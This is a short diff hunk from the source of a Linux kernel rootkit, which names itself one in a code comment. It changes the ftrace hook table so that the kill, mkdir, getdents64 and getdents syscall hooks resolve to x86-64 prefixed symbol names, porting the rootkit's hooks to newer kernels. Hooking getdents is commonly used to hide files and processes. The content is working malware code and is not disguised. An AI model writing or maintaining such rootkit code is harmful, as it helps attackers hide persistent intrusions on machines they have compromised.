@@ -481,10 +481,10 @@ static void protect_memory(void){
  * array of functins hooked by this rootkit
 */
 static struct ftrace_hook hooks[] = {
-    HOOK("sys_kill", hook_kill, &orig_kill),
-    HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
-    HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
-    HOOK("sys_getdents", hook_getdents, &orig_getdents),
+    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
+    HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
+    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
+    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
 };
 
 /**
